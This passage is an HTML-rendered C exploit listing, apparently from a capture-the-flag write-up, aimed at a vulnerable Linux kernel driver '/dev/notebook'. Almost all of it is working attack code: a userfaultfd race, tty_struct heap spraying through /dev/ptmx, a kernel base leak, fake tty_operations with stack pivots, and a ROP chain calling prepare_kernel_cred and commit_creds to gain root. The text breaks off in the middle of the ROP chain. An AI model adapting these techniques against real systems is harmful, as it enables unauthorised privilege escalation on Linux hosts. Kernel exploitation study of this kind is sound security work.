class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernelpwn.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PTM_UNIX98_OPS 0xffffffff81e8e440</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PTY_UNIX98_OPS 0xffffffff81e8e320</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> COMMIT_CREDS 0xffffffff810a9b40</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810a9ef0</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81a00929</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PUSH_RDI_POP_RSP_POP_RBP_ADD_RAX_RDX_RET 0xffffffff81238d50</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MOV_RSP_RBP_POP_RBP_RET 0xffffffff8107875c</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> POP_RDI_RET 0xffffffff81007115</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MOV_RDI_RAX_POP_RBP_RET 0xffffffff81045833 <span class="hljs-comment">// mov rdi, rax; xor eax, eax; cmp rdi, 0x9000000; je 0x245843; pop rbp; ret;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> POP_RDX_RET 0xffffffff81358842</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> RET 0xffffffff81000091</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SWAPGS_POP_RBP_RET 0xffffffff810637d4</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IRETQ 0xffffffff810338bb</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> POP_RDX_POP_R12_POP_RBP_RET 0xffffffff810880c1</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> POP_RSI_POP_RDI_POP_RBX_RET 0xffffffff81079c38</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> POP_RBP_RET 0xffffffff81000367</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> POP_RBX_POP_RBP_RET 0xffffffff81002141</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> POP_RAX_POP_RBX_POP_RBP_RET 0xffffffff810cadf7</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> TTY_STRUCT_SIZE 0x2e0</span><br><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">long</span> page_size;<br><span class="hljs-keyword">static</span> <span class="hljs-keyword">sem_t</span> sem_add, sem_edit;<br><span class="hljs-keyword">static</span> <span class="hljs-keyword">char</span> * buf; <span class="hljs-comment">// for userfaultfd</span><br><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">char</span> *page = <span class="hljs-literal">NULL</span>;<br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> *</span><br><span class="hljs-function"><span class="hljs-title">fault_handler_thread</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *arg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffd_msg</span> <span class="hljs-title">msg</span>;</span><br>    <span class="hljs-keyword">int</span> fault_cnt = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">long</span> uffd;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_copy</span> <span class="hljs-title">uffdio_copy</span>;</span><br>    <span class="hljs-keyword">ssize_t</span> nread;<br><br>    uffd = (<span class="hljs-keyword">long</span>) arg;<br><br>    <span class="hljs-keyword">for</span> (;;) <br>    &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">pollfd</span>;</span><br>        <span class="hljs-keyword">int</span> nready;<br>        pollfd.fd = uffd;<br>        pollfd.events = POLLIN;<br>        nready = poll(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br><br>        <span class="hljs-keyword">if</span> (nready == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;poll&quot;</span>);<br><br>        nread = read(uffd, &amp;msg, <span class="hljs-keyword">sizeof</span>(msg));<br><br>        sleep(<span class="hljs-number">100</span>);<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;EOF on userfaultfd!\n&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;read&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)<br>            errExit(<span class="hljs-string">&quot;Unexpected event on userfaultfd\n&quot;</span>);<br><br>        uffdio_copy.src = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) page;<br>        uffdio_copy.dst = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) msg.arg.pagefault.address &amp;<br>                                              ~(page_size - <span class="hljs-number">1</span>);<br>        uffdio_copy.len = page_size;<br>        uffdio_copy.mode = <span class="hljs-number">0</span>;<br>        uffdio_copy.copy = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_COPY&quot;</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">long</span> note_fd;<br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> </span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">size_t</span> idx;<br>    <span class="hljs-keyword">size_t</span> size;<br>    <span class="hljs-keyword">char</span> * buf;<br>&#125; Note;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">noteAdd</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> idx, <span class="hljs-keyword">size_t</span> size, <span class="hljs-keyword">char</span> * buf)</span></span><br><span class="hljs-function"></span>&#123;<br>    Note note = <br>    &#123;<br>        .idx = idx,<br>        .size = size,<br>        .buf = buf,<br>    &#125;;<br>    ioctl(note_fd, <span class="hljs-number">0x100</span>, &amp;note);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">noteAddWrapper</span><span class="hljs-params">(<span class="hljs-keyword">void</span> * args)</span></span><br><span class="hljs-function"></span>&#123;<br>    Note * note = (Note*) args;<br>    noteAdd(note-&gt;idx, note-&gt;size, note-&gt;buf);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">noteDel</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> idx)</span></span><br><span class="hljs-function"></span>&#123;<br>    Note note = <br>    &#123;<br>        .idx = idx,<br>    &#125;;<br>    ioctl(note_fd, <span class="hljs-number">0x200</span>, &amp;note);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">noteEdit</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> idx, <span class="hljs-keyword">size_t</span> size, <span class="hljs-keyword">char</span> * buf)</span></span><br><span class="hljs-function"></span>&#123;<br>    Note note = <br>    &#123;<br>        .idx = idx,<br>        .size = size,<br>        .buf = buf,<br>    &#125;;<br>    ioctl(note_fd, <span class="hljs-number">0x300</span>, &amp;note);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">noteEditWrapper</span><span class="hljs-params">(<span class="hljs-keyword">void</span> * args)</span></span><br><span class="hljs-function"></span>&#123;<br>    Note * note = (Note*) args;<br>    noteEdit(note-&gt;idx, note-&gt;size, note-&gt;buf);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">noteGift</span><span class="hljs-params">(<span class="hljs-keyword">char</span> * buf)</span></span><br><span class="hljs-function"></span>&#123;<br>    Note note = <br>    &#123;<br>        .buf = buf,<br>    &#125;;<br>    ioctl(note_fd, <span class="hljs-number">100</span>, &amp;note);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">evilAdd</span><span class="hljs-params">(<span class="hljs-keyword">void</span> * args)</span></span><br><span class="hljs-function"></span>&#123;<br>    sem_wait(&amp;sem_add);<br>    noteAdd((<span class="hljs-keyword">int</span>)args, <span class="hljs-number">0x50</span>, buf);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">evilEdit</span><span class="hljs-params">(<span class="hljs-keyword">void</span> * args)</span></span><br><span class="hljs-function"></span>&#123;<br>    sem_wait(&amp;sem_edit);<br>    noteEdit((<span class="hljs-keyword">int</span>)args, <span class="hljs-number">0x2000</span>, buf);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">void</span> * buf;<br>    <span class="hljs-keyword">size_t</span> size;<br>&#125; notebook[<span class="hljs-number">0x10</span>];<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> ** argv, <span class="hljs-keyword">char</span> ** envp)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> tty_fd[<span class="hljs-number">0x100</span>], tty_idx, fake_tty_ops_idx = <span class="hljs-number">-1</span>, fake_stack_idx = <span class="hljs-number">-1</span>, hit_tty = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">size_t</span> tty_data[<span class="hljs-number">0x200</span>], fake_tty_data[<span class="hljs-number">0x200</span>], tty_ops, fake_tty_ops_data[<span class="hljs-number">0x200</span>], rop[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-keyword">pthread_t</span> <span class="hljs-keyword">tmp_t</span>, <span class="hljs-keyword">add_t</span>, <span class="hljs-keyword">edit_t</span>;<br>    Note note;<br><br>    saveStatus();<br>    sem_init(&amp;sem_add, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    sem_init(&amp;sem_edit, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><br>    note_fd = open(<span class="hljs-string">&quot;/dev/notebook&quot;</span>, O_RDWR);<br>    buf = (<span class="hljs-keyword">char</span>*) mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    page = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>);<br>    <span class="hljs-built_in">strcpy</span>(page, <span class="hljs-string">&quot;arttnba3&quot;</span>);<br>    page_size = sysconf(_SC_PAGE_SIZE);<br><br>    <span class="hljs-comment">// register userfaultfd</span><br>    registerUserFaultFd(buf, <span class="hljs-number">0x1000</span>, fault_handler_thread);<br><br>    <span class="hljs-comment">// initialize the notebook</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>    &#123;<br>        noteAdd(i, <span class="hljs-number">0x20</span>, page);<br>        noteEdit(i, TTY_STRUCT_SIZE, page);<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Notebook initialization done.\033[0m&quot;</span>);<br>    sleep(<span class="hljs-number">1</span>);<br><br>    <span class="hljs-comment">// get all the note free and get the threads stuck by userfaultfd to save their ptrs</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>        pthread_create(&amp;<span class="hljs-keyword">edit_t</span>, <span class="hljs-literal">NULL</span>, evilEdit, (<span class="hljs-keyword">void</span>*)i);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Edit threads started.\033[0m&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>        sem_post(&amp;sem_edit);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Edit threads trapped in userfaultfd.\033[0m&quot;</span>);<br>    sleep(<span class="hljs-number">1</span>);<br><br>    <span class="hljs-comment">// heap spraying to hit the tty_struct</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x80</span>; i++)<br>        tty_fd[i] = open(<span class="hljs-string">&quot;/dev/ptmx&quot;</span>, O_RDWR | O_NOCTTY);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Heap spray for tty done.\033[0m&quot;</span>);<br>    sleep(<span class="hljs-number">1</span>);<br><br>    <span class="hljs-comment">// change the size stored in notebook to pass _check_object_size and get the threads stuck by userfaultfd to save the ptrs</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>        pthread_create(&amp;<span class="hljs-keyword">add_t</span>, <span class="hljs-literal">NULL</span>, evilAdd, (<span class="hljs-keyword">void</span>*)i);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Add threads started.\033[0m&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>        sem_post(&amp;sem_add);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Add threads trapped in userfaultfd.\033[0m&quot;</span>);<br>    sleep(<span class="hljs-number">1</span>);<br><br>    <span class="hljs-comment">// check whether we&#x27;ve hit the tty_struct</span><br>    noteGift((<span class="hljs-keyword">char</span>*) notebook);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>    &#123;<br>        read(note_fd, tty_data, i);<br>        <span class="hljs-keyword">if</span> (hit_tty = (*((<span class="hljs-keyword">int</span>*)tty_data) == <span class="hljs-number">0x5401</span>))<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successfully hit the tty_struct at idx \033[0m%d.\n&quot;</span>, tty_idx = i);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Address of the tty_struct: \033[0m%p.\n&quot;</span>, notebook[i].buf);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!hit_tty)<br>        errExit(<span class="hljs-string">&quot;Failed to hit the tty struct.&quot;</span>);<br><br>    <span class="hljs-comment">// get kernel base</span><br>    tty_ops = *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>*)(tty_data + <span class="hljs-number">3</span>);<br>    kernel_offset = ((tty_ops &amp; <span class="hljs-number">0xfff</span>) == (PTY_UNIX98_OPS &amp; <span class="hljs-number">0xfff</span>) ? (tty_ops - PTY_UNIX98_OPS) : tty_ops - PTM_UNIX98_OPS);<br>    kernel_base = (<span class="hljs-keyword">void</span>*) ((<span class="hljs-keyword">size_t</span>)kernel_base + kernel_offset);<br>    prepare_kernel_cred = PREPARE_KERNEL_CRED + kernel_offset;<br>    commit_creds = COMMIT_CREDS + kernel_offset;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Kernel offset: \033[0m0x%llx\n&quot;</span>, kernel_offset);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Kernel base: \033[0m%p\n&quot;</span>, kernel_base);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] prepare_kernel_cred: \033[0m%p\n&quot;</span>, prepare_kernel_cred);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] commit_creds: \033[0m%p\n&quot;</span>, commit_creds);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] swapgs_restore_regs_and_return_to_usermode: \033[0m%p\n&quot;</span>, SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + kernel_offset);<br><br>    <span class="hljs-comment">// find available note as fake tty_ops and fake stack</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>    &#123;<br>        read(note_fd, tty_data, i);<br>        <span class="hljs-keyword">if</span> (*((<span class="hljs-keyword">int</span>*)tty_data) != <span class="hljs-number">0x5401</span>)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (fake_tty_ops_idx == <span class="hljs-number">-1</span>)<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Fake tty_operations at idx \033[0m%d.\n&quot;</span>, fake_tty_ops_idx = i);<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Fake stack at idx \033[0m%d.\n&quot;</span>, fake_stack_idx = i);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (fake_tty_ops_idx == <span class="hljs-number">-1</span> || fake_stack_idx == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;Unable to find enough available notes, you\&#x27;re so lucky that you got so many tty_structs.&quot;</span>);<br><br>    <span class="hljs-comment">// adjust the size of the object</span><br>    noteEdit(fake_tty_ops_idx, <span class="hljs-keyword">sizeof</span>(struct tty_operations), fake_tty_data);<br>    noteEdit(fake_stack_idx, <span class="hljs-number">0x100</span>, rop);<br>    noteGift((<span class="hljs-keyword">char</span>*) notebook);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Address of the fake tty_operations: \033[0m%p.\n&quot;</span>, notebook[fake_tty_ops_idx].buf);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Address of the fake stack: \033[0m%p.\n&quot;</span>, notebook[fake_stack_idx].buf);<br><br>    <span class="hljs-comment">// restore tty_struct data</span><br>    read(note_fd, tty_data, tty_idx);<br>    <span class="hljs-built_in">memcpy</span>(fake_tty_data, tty_data, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">size_t</span>) * <span class="hljs-number">0x200</span>);<br><br>    <span class="hljs-comment">// first migration to tty_struct</span><br>    ((struct tty_operations *)fake_tty_ops_data)-&gt;write = PUSH_RDI_POP_RSP_POP_RBP_ADD_RAX_RDX_RET + kernel_offset;<br><br>    <span class="hljs-comment">// second migration back to tty_operations</span><br>    fake_tty_data[<span class="hljs-number">1</span>] = POP_RBX_POP_RBP_RET + kernel_offset;<br>    fake_tty_data[<span class="hljs-number">3</span>] = notebook[fake_tty_ops_idx].buf;<br>    fake_tty_data[<span class="hljs-number">4</span>] = MOV_RSP_RBP_POP_RBP_RET + kernel_offset;<br><br>    <span class="hljs-comment">// third migration to a note</span><br>    fake_tty_ops_data[<span class="hljs-number">1</span>] = POP_RBP_RET + kernel_offset;<br>    fake_tty_ops_data[<span class="hljs-number">2</span>] = notebook[fake_stack_idx].buf;<br>    fake_tty_ops_data[<span class="hljs-number">3</span>] = MOV_RSP_RBP_POP_RBP_RET + kernel_offset;<br><br>    <span class="hljs-comment">// final rop</span><br>    <span class="hljs-keyword">int</span> rop_idx = <span class="hljs-number">0</span>;<br>    rop[rop_idx++] = <span class="hljs-number">0x3361626e74747261</span>; <span class="hljs-comment">//arttnba3</span><br>    rop[rop_idx++] = POP_RDI_RET + kernel_offset;<br>    rop[rop_idx++] = <span class="hljs-number">0</span>;<br>    rop[rop_idx++] = prepare_kernel_cred;<br>    rop[rop_idx++] = POP_RDX_RET + kernel_offset;<br>    rop[rop_idx++] = RET;<br>    rop[rop_idx++] = MOV_RDI_RAX_POP_RBP_RET + kernel_offset;<br>    rop[rop_idx++] = <span class="hljs-number">0x3361626e74747261</span>; <span class="hljs-comment">//arttnba3</span><br>    rop[rop_idx++] = commit_creds;<br>    rop[rop_idx++] = 